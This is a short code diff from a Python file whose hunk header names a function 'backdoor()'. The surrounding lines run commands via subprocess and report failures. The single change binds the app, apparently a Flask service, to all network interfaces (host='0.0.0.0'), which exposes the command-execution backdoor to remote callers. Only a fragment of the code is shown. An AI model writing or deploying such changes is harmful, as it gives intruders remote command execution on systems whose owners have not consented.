@@ -95,7 +95,7 @@ def backdoor():
         except subprocess.CalledProcessError as e:
             return f'Command execution failed with error code {e.returncode}'
 
-    app.run()
+    app.run(host='0.0.0.0')
 
 def handle_exit(signal, frame):
     """
